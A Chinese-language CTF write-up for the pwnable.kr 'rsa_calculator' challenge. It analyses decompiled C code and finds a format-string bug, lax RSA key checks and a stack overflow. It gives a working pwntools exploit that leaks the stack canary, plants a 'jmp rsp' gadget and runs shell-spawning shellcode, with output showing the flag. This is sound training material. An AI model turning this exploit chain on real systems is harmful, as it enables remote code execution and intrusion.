---
title: pwnable.kr-rsa_calculator
date: 2018-03-14 12:59:32
tags: [pwnable.kr,PWN]
categories: CTF
copyright: true
---
# 前言
读代码题，虽然是逆向代码，哈哈。这道题得细心找，不能急，否则就得像我一样花了很长时间在`printf`的漏洞利用上了，悲催。
# 分析
分析反编译代码
```c
signed __int64 set_key()
{
  int v1; // [sp+18h] [bp-18h]@7
  int v2; // [sp+1Ch] [bp-14h]@7
  unsigned int i; // [sp+20h] [bp-10h]@1
  int v4; // [sp+24h] [bp-Ch]@7
  int v5; // [sp+28h] [bp-8h]@7
  __int16 v6; // [sp+2Ch] [bp-4h]@1
  __int16 v7; // [sp+2Eh] [bp-2h]@1

  puts("-SET RSA KEY-");
  printf("p : ");
  __isoc99_scanf("%d", &v6);
  printf("q : ", &v6);
  __isoc99_scanf("%d", &v7);
  printf("p, q, set to %d, %d\n", (unsigned int)v6, (unsigned int)v7);
  puts("-current private key and public keys-");
  printf("public key : ");
  for ( i = 0; i <= 7; ++i )
    printf("%02x ", pub[i]);
  printf("\npublic key : ");
  for ( i = 0; i <= 7; ++i )
    printf("%02x ", pri[i]);
  putchar(10);
  v4 = v6 * v7;
  v5 = (v6 - 1) * (v7 - 1);
  printf("N set to %d, PHI set to %d\n", (unsigned int)v4, (unsigned int)v5);
  printf("set public key exponent e : ");
  __isoc99_scanf("%d", &v1);
  printf("set private key exponent d : ", &v1);
  __isoc99_scanf("%d", &v2);
  if ( v1 < (unsigned int)v5 && v2 < (unsigned int)v5 && v2 * v1 % (unsigned int)v5 != 1 )
  {
    puts("wrong parameters for key generation");
    exit(0);
  }
  if ( (unsigned int)v4 <= 0xFF )
  {
    puts("key length too short");
    exit(0);
  }
  set_pub_key(v1, v4, (__int64)pub);
  set_pri_key(v2, v4, (__int64)pri);
  puts("key set ok");
  printf("pubkey(e,n) : (%d(%08x), %d(%08x))\n", (unsigned int)v1, (unsigned int)v1, (unsigned int)v4, (unsigned int)v4);
  printf("prikey(d,n) : (%d(%08x), %d(%08x))\n", (unsigned int)v2, (unsigned int)v2, (unsigned int)v4, (unsigned int)v4);
  is_set = 1;
  return 1LL;
}
```
```c
__int64 RSA_decrypt()
{
  __int64 result; // rax@2
  bool v1; // dl@10
  char *v2; // rdx@12
  char *v3; // rsi@14
  int v4; // eax@15
  __int64 v5; // rdx@18
  int v6; // [sp+Ch] [bp-634h]@3
  int v7; // [sp+10h] [bp-630h]@5
  int i; // [sp+14h] [bp-62Ch]@11
  int v9; // [sp+18h] [bp-628h]@11
  int v10; // [sp+1Ch] [bp-624h]@6
  char v11; // [sp+20h] [bp-620h]@12
  char v12; // [sp+21h] [bp-61Fh]@12
  char v13; // [sp+22h] [bp-61Eh]@12
  char ptr; // [sp+2Fh] [bp-611h]@6
  char v15[1024]; // [sp+30h] [bp-610h]@9
  char src[520]; // [sp+430h] [bp-210h]@11
  __int64 v17; // [sp+638h] [bp-8h]@1

  v17 = *MK_FP(__FS__, 40LL);
  if ( is_set )
  {
    v6 = 0;
    printf("how long is your data?(max=1024) : ");
    __isoc99_scanf("%d", &v6);
    if ( v6 <= 1024 )
    {
      v7 = 0;
      fgetc(stdin);
      puts("paste your hex encoded data");
      while ( 1 )
      {
        v1 = v6-- != 0;
        if ( !v1 )
          break;
        v10 = fread(&ptr, 1uLL, 1uLL, stdin);
        if ( !v10 )
          exit(0);
        if ( ptr == 10 )
          break;
        v15[v7++] = ptr;
      }
      memset(src, 0, 0x200uLL);
      i = 0;
      v9 = 0;
      while ( 2 * v7 > i )
      {
        v11 = v15[i];
        v12 = v15[i + 1];
        v13 = 0;
        v2 = &src[v9++];
        __isoc99_sscanf(&v11, "%02x", v2);
        i += 2;
      }
      v3 = src;
      memcpy(g_ebuf, src, v7);
      for ( i = 0; v7 / 8 > i; ++i )
      {
        v3 = pri;
        v4 = decrypt(g_ebuf[i], (__int64)pri);
        *(&g_pbuf + i) = v4;
      }
      *(&g_pbuf + i) = 0;
      puts("- decrypted result -");
      printf(&g_pbuf, v3);                      // /格式化字符串漏洞
      putchar(10);
      result = 0LL;
    }
    else
    {
      puts("data length exceeds buffer size");
      result = 0LL;
    }
  }
  else
  {
    puts("set RSA key first");
    result = 0LL;
  }
  v5 = *MK_FP(__FS__, 40LL) ^ v17;
  return result;
}
```
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int *v3; // rsi@1
  bool v5; // dl@4
  int v6; // [sp+Ch] [bp-4h]@1

  setvbuf(stdout, 0LL, 2, 0LL);
  v3 = 0LL;
  setvbuf(stdin, 0LL, 1, 0LL);
  puts("- Buggy RSA Calculator -\n");
  func[0] = (__int64)set_key;
  qword_602508 = (__int64)RSA_encrypt;
  qword_602510 = (__int64)RSA_decrypt;
  qword_602518 = (__int64)help;
  qword_602520 = (__int64)myexit;
  dword_602528 = 1634629488;
  dword_60252C = 778398818;
  dword_602530 = 1936290411;
  dword_602534 = 1953719650;
  qword_602538 = (__int64)system;
  v6 = 0;
  while ( 1 )
  {
    puts("\n- select menu -");
    puts("- 1. : set key pair");
    puts("- 2. : encrypt");
    puts("- 3. : decrypt");
    puts("- 4. : help");
    puts("- 5. : exit");
    printf("> ", v3);
    v3 = &v6;
    __isoc99_scanf("%d", &v6);
    if ( (unsigned int)(v6 + 1) > 6 )
      break;
    ((void (__fastcall *)(const char *, int *))func[(unsigned __int64)(unsigned int)(v6 - 1)])("%d", &v6);
    v5 = g_try++ > 10;
    if ( v5 )
    {
      puts("this is demo version");
      exit(0);
    }
  }
  puts("invalid menu");
  return 0;
}
```
代码对于我来说还是有点长的，哈哈。贴了几个关键的函数，大致分析一下程序很容易找到在`RSA_decrypt`函数中存在`printf`格式化字符串漏洞，利用该漏洞可以读写内存。但是仔细分析后发现，仅仅利用该漏洞无法更改返回地址或则是got表。那就需要寻找另外的漏洞了。
接下来就是仔细分析程序各个部分的功能找出漏洞，经过简单分析可以发现另外两处漏洞。
- `set_key`函数在设置`key`时没有严格按照RSA算法的要求（具体算法百度），导致可以很容易设置想要的值。
- `RSA_decrypt`函数中，在向`src`变量赋值时存在栈溢出。

主要看看这个栈溢出。输入的密文`v15`是一个16进制编码的字符串，这里就是将`v15`转化为字符串存到`src`中。如果`v15`的长度为最大1024字节，那么这里的循环次数就是`2×v7/2=1024`，而每次循环`src`都要赋一个字节的值，所以循环`520`次后就开始覆盖栈的其他空间了。继续分析，其实当循环`512`次后`v15`的索引就已经越界了，其后就是`src`变量。那么后续覆盖返回地址和写shellcode就是使用`src`中的16进制编码的字符串了。当然`RSA_decrypt`函数是有`stack canary`的，需要先利用格式化字符串漏洞leak出来。
整理利用思路，这里我先leak处`canary`，然后利用栈溢出覆盖返回地址为`pri`变量的地址之后跟shellcode，并利用`set_key`函数的缺陷设置`pri`的值为`jmp rsp`指令。这样当函数返回时会跳转到`pri`执行`jmp rsp`从而执行shell。下面贴出exp
```python
from pwn import *

def strToHex(s):
    ret = ''
    for i in s:
        ret += '{:02x}'.format(ord(i))
    return ret

def work(DEBUG):
    context(arch='amd64',os='linux',log_level='info')
    if DEBUG:
        r = process('./rsa_calculator')
    else:
        r = remote('pwnable.kr',9012)
        
    pri_addr = 0x602960
        
    #set key
    r.sendline('1')
    r.recvuntil('p : ')
    r.sendline('61\n53\n17\n2753')
    
    #get stack canary
    r.sendline('2\n1024\n%205$016lx')
    r.recvuntil('(hex encoded) -\n')
    cipher = r.recvline()
    r.sendline('3\n1024\n'+cipher)
    r.recvuntil('- decrypted result -\n')
    stack_canary = int(r.recvline(),16)
    
    #get shell
    r.sendline('1\n3\n29312\n1\n58623') #asm('jmp rsp')=0xe4ff=58623
    r.recvuntil('> ')
    tmp = strToHex('a'*8+p64(stack_canary)+'a'*8+p64(pri_addr)+asm(shellcraft.sh())) #set retaddr=pri_addr
    r.sendline('3\n1024\n'+strToHex(tmp+'30'*(1024-len(tmp))))
    
    r.interactive()
    


work(False)
```
```bash
root@1:~/桌面/test$ python 1.py 
[+] Opening connection to pwnable.kr on port 9012: Done
[*] Switching to interactive mode
-SET RSA KEY-
p : q : p, q, set to 3, 29312
-current private key and public keys-
public key : 11 00 00 00 a1 0c 00 00 
public key : c1 0a 00 00 a1 0c 00 00 
N set to 87936, PHI set to 58622
set public key exponent e : set private key exponent d : key set ok
pubkey(e,n) : (1(00000001), 87936(00015780))
prikey(d,n) : (58623(0000e4ff), 87936(00015780))

- select menu -
- 1. : set key pair
- 2. : encrypt
- 3. : decrypt
- 4. : help
- 5. : exit
> how long is your data?(max=1024) : paste your hex encoded data
- decrypted result -

$ ls
flag
log
rsa_calculator
super.pl
$ cat flag
what a stupid buggy rsa calculator! :(
$  
```
# 总结
读逆向代码要细心，不能急躁，否则可能会花很多时间。